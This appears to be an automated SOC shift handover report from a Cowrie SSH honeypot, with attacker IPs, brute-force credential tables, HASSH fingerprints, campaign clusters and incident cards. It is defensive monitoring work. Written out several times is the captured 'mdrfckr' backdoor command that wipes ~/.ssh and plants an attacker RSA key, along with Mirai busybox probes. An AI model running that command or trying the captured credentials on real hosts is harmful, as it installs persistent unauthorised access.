# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-24 |
| **Generated At** | 2026-09-24T09:10:40Z |
| **Shift Time** | 09:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **405** |
| Confirmed Threats | **363** |
| False Positives Filtered | **42** (10.4%) |
| Unique Attacker IPs | **141** |
| Countries of Origin | **40** |
| High Severity Cases | **124** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **281** |
| Malware Samples Analyzed | **5** HIGH · **22** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **184** |
| Unique Credential Pairs | **86** |
| Unique Usernames | **34** |
| Unique Passwords | **59** |
| Successful Auth Pairs | **139** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 48 |
| `345gs5662d34` | 45 |
| `support` | 10 |
| `admin` | 9 |
| `debian` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 45 |
| `3245gs5662d34` | 43 |
| `support` | 10 |
| `admin` | 9 |
| `` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 45 |
| `root` | `3245gs5662d34` | 17 |
| `support` | `support` | 10 |
| `admin` | `admin` | 9 |
| `root` | `` | 7 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.52.136.146` | 2026-09-24T03:05:52 |
| `*1` | `$4` | `34.52.136.146` | 2026-09-24T03:06:01 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 7964` | `34.52.136.146` | 2026-09-24T03:06:03 |
| `proxyuser` | `test123` | `103.216.119.46` | 2026-09-24T03:22:05 |
| `345gs5662d34` | `345gs5662d34` | `103.216.119.46` | 2026-09-24T03:22:09 |
| `proxyuser` | `3245gs5662d34` | `103.216.119.46` | 2026-09-24T03:22:11 |
| `root` | `pass@123` | `45.125.67.31` | 2026-09-24T03:22:50 |
| `345gs5662d34` | `345gs5662d34` | `45.125.67.31` | 2026-09-24T03:22:54 |
| `root` | `3245gs5662d34` | `45.125.67.31` | 2026-09-24T03:22:55 |
| `admin` | `admin` | `195.178.110.204` | 2026-09-24T03:24:57 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.195.96.243` | 2026-09-24T03:32:23 |
| `*1` | `$4` | `35.195.96.243` | 2026-09-24T03:32:37 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 9053` | `35.195.96.243` | 2026-09-24T03:32:38 |
| `support` | `support` | `176.53.159.196` | 2026-09-24T03:33:41 |
| `root` | `american` | `20.219.91.90` | 2026-09-24T03:47:13 |
| `345gs5662d34` | `345gs5662d34` | `20.219.91.90` | 2026-09-24T03:47:17 |
| `root` | `3245gs5662d34` | `20.219.91.90` | 2026-09-24T03:47:18 |
| `tester1` | `123456` | `20.243.208.191` | 2026-09-24T03:48:28 |
| `345gs5662d34` | `345gs5662d34` | `20.243.208.191` | 2026-09-24T03:48:31 |
| `tester1` | `3245gs5662d34` | `20.243.208.191` | 2026-09-24T03:48:32 |
| `web` | `pass` | `103.168.135.187` | 2026-09-24T03:52:08 |
| `345gs5662d34` | `345gs5662d34` | `103.168.135.187` | 2026-09-24T03:52:12 |
| `web` | `3245gs5662d34` | `103.168.135.187` | 2026-09-24T03:52:14 |
| `root` | `` | `160.119.66.206` | 2026-09-24T04:07:40 |
| `root` | `ubuntu` | `115.190.181.231` | 2026-09-24T04:08:15 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.156.95.119` | 2026-09-24T04:14:13 |
| `*1` | `$4` | `34.156.95.119` | 2026-09-24T04:14:27 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 4514` | `34.156.95.119` | 2026-09-24T04:14:29 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `47.251.110.209` | 2026-09-24T04:32:55 |
| `root` | `Password1@` | `10.0.0.73` | 2026-09-24T04:34:17 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-24T04:34:22 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T04:34:24 |
| `sol` | `sol123` | `10.0.0.73` | 2026-09-24T04:34:32 |
| `sol` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T04:34:36 |
| `root` | `Xz123123` | `10.0.0.73` | 2026-09-24T04:34:54 |
| `wanghao` | `wanghao` | `103.143.231.24` | 2026-09-24T04:36:00 |
| `345gs5662d34` | `345gs5662d34` | `103.143.231.24` | 2026-09-24T04:36:02 |
| `wanghao` | `3245gs5662d34` | `103.143.231.24` | 2026-09-24T04:36:02 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `45.79.181.223` | 2026-09-24T04:38:15 |
| `deploy` | `123qweQWE` | `10.0.0.73` | 2026-09-24T04:38:53 |
| `logviewer` | `logviewer` | `10.0.0.73` | 2026-09-24T04:39:41 |
| `logviewer` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T04:39:47 |
| `vcsa` | `12345` | `10.0.0.73` | 2026-09-24T04:40:19 |
| `vcsa` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T04:40:24 |
| `root` | `Admin123789` | `10.0.0.73` | 2026-09-24T04:40:45 |
| `support` | `support` | `10.0.0.73` | 2026-09-24T04:41:39 |
| `debian` | `Debian@2025` | `10.0.0.73` | 2026-09-24T04:42:10 |
| `debian` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T04:42:15 |
| `ubnt` | `1234` | `77.90.185.17` | 2026-09-24T05:08:06 |
| `root` | `r00t` | `77.90.185.20` | 2026-09-24T05:08:59 |
| `ubnt` | `1234` | `10.0.0.73` | 2026-09-24T05:11:03 |
| `root` | `server@123` | `81.192.46.32` | 2026-09-24T05:16:56 |
| `345gs5662d34` | `345gs5662d34` | `81.192.46.32` | 2026-09-24T05:16:58 |
| `root` | `3245gs5662d34` | `81.192.46.32` | 2026-09-24T05:16:59 |
| `root` | `test2024` | `52.172.177.191` | 2026-09-24T05:17:32 |
| `345gs5662d34` | `345gs5662d34` | `52.172.177.191` | 2026-09-24T05:17:36 |
| `root` | `3245gs5662d34` | `52.172.177.191` | 2026-09-24T05:17:37 |
| `user` | `admin123!` | `115.79.192.73` | 2026-09-24T05:18:53 |
| `root` | `1` | `116.71.136.125` | 2026-09-24T05:18:54 |
| `root` | `1A2b3c4d` | `180.180.242.201` | 2026-09-24T05:18:56 |
| `345gs5662d34` | `345gs5662d34` | `115.79.192.73` | 2026-09-24T05:18:59 |
| `345gs5662d34` | `345gs5662d34` | `116.71.136.125` | 2026-09-24T05:18:59 |
| `user` | `3245gs5662d34` | `115.79.192.73` | 2026-09-24T05:19:00 |
| `root` | `3245gs5662d34` | `116.71.136.125` | 2026-09-24T05:19:01 |
| `345gs5662d34` | `345gs5662d34` | `180.180.242.201` | 2026-09-24T05:19:01 |
| `root` | `3245gs5662d34` | `180.180.242.201` | 2026-09-24T05:19:03 |
| `root` | `aA123456789` | `196.0.3.188` | 2026-09-24T05:19:43 |
| `345gs5662d34` | `345gs5662d34` | `196.0.3.188` | 2026-09-24T05:19:48 |
| `root` | `3245gs5662d34` | `196.0.3.188` | 2026-09-24T05:19:50 |
| `root` | `` | `77.239.124.121` | 2026-09-24T05:31:03 |
| `root` | `A123456A` | `10.0.0.73` | 2026-09-24T05:46:40 |
| `root` | `)OKM9ijn` | `10.0.0.73` | 2026-09-24T05:48:17 |
| `root` | `robin123` | `10.0.0.73` | 2026-09-24T05:48:31 |
| `root` | `12345678aB` | `10.0.0.73` | 2026-09-24T05:48:36 |
| `ubuntu` | `abcd@1234` | `10.0.0.73` | 2026-09-24T05:48:37 |
| `ubuntu` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T05:48:44 |
| `root` | `alexander` | `10.0.0.73` | 2026-09-24T05:52:05 |
| `admin` | `admin` | `176.65.134.121` | 2026-09-24T05:52:18 |
| `admin` | `admin` | `39.109.116.214` | 2026-09-24T05:53:56 |
| `admin` | `admin` | `34.62.244.233` | 2026-09-24T06:06:05 |
| `root` | `jarvis` | `161.132.40.54` | 2026-09-24T06:28:41 |
| `345gs5662d34` | `345gs5662d34` | `161.132.40.54` | 2026-09-24T06:28:44 |
| `root` | `3245gs5662d34` | `161.132.40.54` | 2026-09-24T06:28:45 |
| `backend` | `1` | `14.18.236.71` | 2026-09-24T06:31:42 |
| `345gs5662d34` | `345gs5662d34` | `14.18.236.71` | 2026-09-24T06:31:46 |
| `backend` | `3245gs5662d34` | `14.18.236.71` | 2026-09-24T06:31:48 |
| `admin` | `admin` | `10.0.0.73` | 2026-09-24T06:49:37 |
| `andrew` | `1234` | `194.226.49.237` | 2026-09-24T07:10:10 |
| `345gs5662d34` | `345gs5662d34` | `194.226.49.237` | 2026-09-24T07:10:12 |
| `andrew` | `3245gs5662d34` | `194.226.49.237` | 2026-09-24T07:10:13 |
| `root` | `mimi` | `103.86.198.253` | 2026-09-24T07:10:17 |
| `345gs5662d34` | `345gs5662d34` | `103.86.198.253` | 2026-09-24T07:10:22 |
| `root` | `3245gs5662d34` | `103.86.198.253` | 2026-09-24T07:10:23 |
| `pruebas` | `pruebas` | `116.255.159.152` | 2026-09-24T07:10:59 |
| `debian` | `123` | `152.32.216.152` | 2026-09-24T07:11:28 |
| `345gs5662d34` | `345gs5662d34` | `152.32.216.152` | 2026-09-24T07:11:32 |
| `debian` | `3245gs5662d34` | `152.32.216.152` | 2026-09-24T07:11:34 |
| `phil` | `phil123` | `217.154.38.181` | 2026-09-24T07:11:35 |
| `345gs5662d34` | `345gs5662d34` | `217.154.38.181` | 2026-09-24T07:11:37 |
| `phil` | `3245gs5662d34` | `217.154.38.181` | 2026-09-24T07:11:38 |
| `casino` | `casino123` | `203.150.107.87` | 2026-09-24T07:12:29 |
| `345gs5662d34` | `345gs5662d34` | `203.150.107.87` | 2026-09-24T07:12:35 |
| `casino` | `3245gs5662d34` | `203.150.107.87` | 2026-09-24T07:12:37 |
| `denis` | `123` | `114.220.238.21` | 2026-09-24T07:12:42 |
| `345gs5662d34` | `345gs5662d34` | `114.220.238.21` | 2026-09-24T07:12:46 |
| `denis` | `3245gs5662d34` | `114.220.238.21` | 2026-09-24T07:12:48 |
| `reza` | `reza123` | `175.198.62.180` | 2026-09-24T07:14:26 |
| `345gs5662d34` | `345gs5662d34` | `175.198.62.180` | 2026-09-24T07:14:30 |
| `reza` | `3245gs5662d34` | `175.198.62.180` | 2026-09-24T07:14:31 |
| `mc` | `mc123` | `171.25.158.74` | 2026-09-24T07:17:15 |
| `345gs5662d34` | `345gs5662d34` | `171.25.158.74` | 2026-09-24T07:17:18 |
| `mc` | `3245gs5662d34` | `171.25.158.74` | 2026-09-24T07:17:18 |
| `debian` | `root123` | `10.0.0.73` | 2026-09-24T07:19:47 |
| `github` | `1` | `219.250.188.143` | 2026-09-24T07:20:48 |
| `345gs5662d34` | `345gs5662d34` | `219.250.188.143` | 2026-09-24T07:20:52 |
| `github` | `3245gs5662d34` | `219.250.188.143` | 2026-09-24T07:20:53 |
| `bot2` | `bot2` | `197.199.224.52` | 2026-09-24T07:23:49 |
| `345gs5662d34` | `345gs5662d34` | `197.199.224.52` | 2026-09-24T07:23:52 |
| `bot2` | `3245gs5662d34` | `197.199.224.52` | 2026-09-24T07:23:53 |
| `mohsen` | `mohsen` | `124.174.15.24` | 2026-09-24T07:26:03 |
| `345gs5662d34` | `345gs5662d34` | `124.174.15.24` | 2026-09-24T07:26:08 |
| `root` | `123123a` | `115.190.213.206` | 2026-09-24T07:26:57 |
| `345gs5662d34` | `345gs5662d34` | `115.190.213.206` | 2026-09-24T07:27:02 |
| `root` | `` | `23.94.206.233` | 2026-09-24T07:35:39 |
| `vpn` | `vpnvpn` | `195.58.38.201` | 2026-09-24T07:42:19 |
| `345gs5662d34` | `345gs5662d34` | `195.58.38.201` | 2026-09-24T07:42:21 |
| `vpn` | `3245gs5662d34` | `195.58.38.201` | 2026-09-24T07:42:22 |
| `ubuntu` | `Admin@1234` | `102.140.97.134` | 2026-09-24T07:42:24 |
| `345gs5662d34` | `345gs5662d34` | `102.140.97.134` | 2026-09-24T07:42:27 |
| `ubuntu` | `3245gs5662d34` | `102.140.97.134` | 2026-09-24T07:42:28 |
| `puneet` | `puneet` | `107.155.15.8` | 2026-09-24T07:44:02 |
| `345gs5662d34` | `345gs5662d34` | `107.155.15.8` | 2026-09-24T07:44:05 |
| `puneet` | `3245gs5662d34` | `107.155.15.8` | 2026-09-24T07:44:06 |
| `root` | `` | `94.154.43.69` | 2026-09-24T07:52:53 |
| `root` | `JMeCkTRk5q` | `47.95.32.212` | 2026-09-24T08:36:48 |
| `examen` | `examen` | `10.0.0.73` | 2026-09-24T08:49:08 |
| `examen` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T08:49:13 |
| `julian` | `julian123` | `10.0.0.73` | 2026-09-24T08:52:16 |
| `julian` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T08:52:19 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **405** |
| Sessions with Fingerprint | **22** |
| Unique HASSH Fingerprints | **22** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 109 |
| Go SSH scanner | 17 |
| Nmap scanner | 7 |
| OpenSSH | 5 |
| Unknown | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 85 | 31 |
| `03a80b21afa8...` | Modern SSH client | 13 | 3 |
| `eff4c24daffc...` | Modern SSH client | 6 | 1 |
| `e788c657d1a2...` | Mirai/variant | 6 | 1 |
| `390ffe68a68c...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 85 | 31 | Mirai/variant |
| `03a80b21afa8...` | libssh | 13 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 9 | 8 | — |
| `eff4c24daffc...` | Go SSH scanner | 6 | 1 | Modern SSH client |
| `e788c657d1a2...` | Nmap scanner | 6 | 1 | Mirai/variant |
| `390ffe68a68c...` | OpenSSH | 4 | 1 | Modern SSH client |
| `873a5fb5fedc...` | Go SSH scanner | 3 | 3 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **12** |
| Campaign Clusters | **6** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 30 | 30 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 4 | 2 | `T1105, T1070, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `77.239.124.121`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.216.119.46`, `196.0.3.188`, `20.243.208.191`, `103.143.231.24`, `116.71.136.125`, `217.154.38.181`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **141** |
| Unique ASNs | **71** |
| High-Risk ASNs | **55** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 49 | HIGH |
| `AS396982` | Google LLC | 8 | HIGH |
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS213412` | ONYPHE SAS | 3 | LOW |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS22047` | VTR BANDA ANCHA S.A. | 2 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (124)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-738b10e3c52b

| Field | Detail |
|---|---|
| **Source IP** | `34.52.136[.]146` |
| **First Seen** | 2026-09-24 03:05 |
| **Last Seen** | 2026-09-24 03:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:05:52` | `cowrie.session.connect` |
| `2026-09-24 03:05:52` | `cowrie.login.success` |
| `2026-09-24 03:05:53` | `cowrie.session.params` |
| `2026-09-24 03:05:53` | `cowrie.command.input` |
| `2026-09-24 03:05:53` | `cowrie.command.input` |
| `2026-09-24 03:05:53` | `cowrie.command.failed` |
| `2026-09-24 03:05:53` | `cowrie.command.input` |
| `2026-09-24 03:05:53` | `cowrie.log.closed` |
| `2026-09-24 03:05:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.52.136[.]146` to AbuseIPDB if not already reported
- [ ] Block `34.52.136[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ac67b068816

| Field | Detail |
|---|---|
| **Source IP** | `34.52.136[.]146` |
| **First Seen** | 2026-09-24 03:06 |
| **Last Seen** | 2026-09-24 03:06 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:06:01` | `cowrie.session.connect` |
| `2026-09-24 03:06:01` | `cowrie.login.success` |
| `2026-09-24 03:06:01` | `cowrie.session.params` |
| `2026-09-24 03:06:01` | `cowrie.command.input` |
| `2026-09-24 03:06:02` | `cowrie.command.failed` |
| `2026-09-24 03:06:14` | `cowrie.log.closed` |
| `2026-09-24 03:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.52.136[.]146` to AbuseIPDB if not already reported
- [ ] Block `34.52.136[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a87493c01b9

| Field | Detail |
|---|---|
| **Source IP** | `34.52.136[.]146` |
| **First Seen** | 2026-09-24 03:06 |
| **Last Seen** | 2026-09-24 03:06 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:06:03` | `cowrie.session.connect` |
| `2026-09-24 03:06:03` | `cowrie.login.success` |
| `2026-09-24 03:06:03` | `cowrie.session.params` |
| `2026-09-24 03:06:03` | `cowrie.command.input` |
| `2026-09-24 03:06:14` | `cowrie.log.closed` |
| `2026-09-24 03:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.52.136[.]146` to AbuseIPDB if not already reported
- [ ] Block `34.52.136[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60b13c874b90

| Field | Detail |
|---|---|
| **Source IP** | `103.216.119[.]46` |
| **First Seen** | 2026-09-24 03:22 |
| **Last Seen** | 2026-09-24 03:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:22:03` | `cowrie.session.connect` |
| `2026-09-24 03:22:03` | `cowrie.client.version` |
| `2026-09-24 03:22:04` | `cowrie.client.kex` |
| `2026-09-24 03:22:05` | `cowrie.login.success` |
| `2026-09-24 03:22:06` | `cowrie.session.params` |
| `2026-09-24 03:22:06` | `cowrie.command.input` |
| `2026-09-24 03:22:06` | `cowrie.command.failed` |
| `2026-09-24 03:22:06` | `cowrie.log.closed` |
| `2026-09-24 03:22:07` | `cowrie.session.params` |
| `2026-09-24 03:22:07` | `cowrie.command.input` |
| `2026-09-24 03:22:07` | `cowrie.session.file_download` |
| `2026-09-24 03:22:07` | `cowrie.log.closed` |
| `2026-09-24 03:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.216.119[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.216.119[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24a4ee9d4f0d

| Field | Detail |
|---|---|
| **Source IP** | `103.216.119[.]46` |
| **First Seen** | 2026-09-24 03:22 |
| **Last Seen** | 2026-09-24 03:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:22:08` | `cowrie.session.connect` |
| `2026-09-24 03:22:08` | `cowrie.client.version` |
| `2026-09-24 03:22:08` | `cowrie.client.kex` |
| `2026-09-24 03:22:09` | `cowrie.login.success` |
| `2026-09-24 03:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.216.119[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.216.119[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-453b18164d20

| Field | Detail |
|---|---|
| **Source IP** | `103.216.119[.]46` |
| **First Seen** | 2026-09-24 03:22 |
| **Last Seen** | 2026-09-24 03:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:22:09` | `cowrie.session.connect` |
| `2026-09-24 03:22:09` | `cowrie.client.version` |
| `2026-09-24 03:22:10` | `cowrie.client.kex` |
| `2026-09-24 03:22:11` | `cowrie.login.success` |
| `2026-09-24 03:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.216.119[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.216.119[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d7b294dc9d6

| Field | Detail |
|---|---|
| **Source IP** | `45.125.67[.]31` |
| **First Seen** | 2026-09-24 03:22 |
| **Last Seen** | 2026-09-24 03:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:22:49` | `cowrie.session.connect` |
| `2026-09-24 03:22:49` | `cowrie.client.version` |
| `2026-09-24 03:22:49` | `cowrie.client.kex` |
| `2026-09-24 03:22:50` | `cowrie.login.success` |
| `2026-09-24 03:22:51` | `cowrie.session.params` |
| `2026-09-24 03:22:51` | `cowrie.command.input` |
| `2026-09-24 03:22:51` | `cowrie.command.failed` |
| `2026-09-24 03:22:51` | `cowrie.log.closed` |
| `2026-09-24 03:22:52` | `cowrie.session.params` |
| `2026-09-24 03:22:52` | `cowrie.command.input` |
| `2026-09-24 03:22:52` | `cowrie.session.file_download` |
| `2026-09-24 03:22:52` | `cowrie.log.closed` |
| `2026-09-24 03:22:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.125.67[.]31` to AbuseIPDB if not already reported
- [ ] Block `45.125.67[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f578294a8a9e

| Field | Detail |
|---|---|
| **Source IP** | `45.125.67[.]31` |
| **First Seen** | 2026-09-24 03:22 |
| **Last Seen** | 2026-09-24 03:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:22:53` | `cowrie.session.connect` |
| `2026-09-24 03:22:53` | `cowrie.client.version` |
| `2026-09-24 03:22:53` | `cowrie.client.kex` |
| `2026-09-24 03:22:54` | `cowrie.login.success` |
| `2026-09-24 03:22:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.125.67[.]31` to AbuseIPDB if not already reported
- [ ] Block `45.125.67[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a33742fa9a1

| Field | Detail |
|---|---|
| **Source IP** | `45.125.67[.]31` |
| **First Seen** | 2026-09-24 03:22 |
| **Last Seen** | 2026-09-24 03:22 |
| **Session Duration** | 1s |
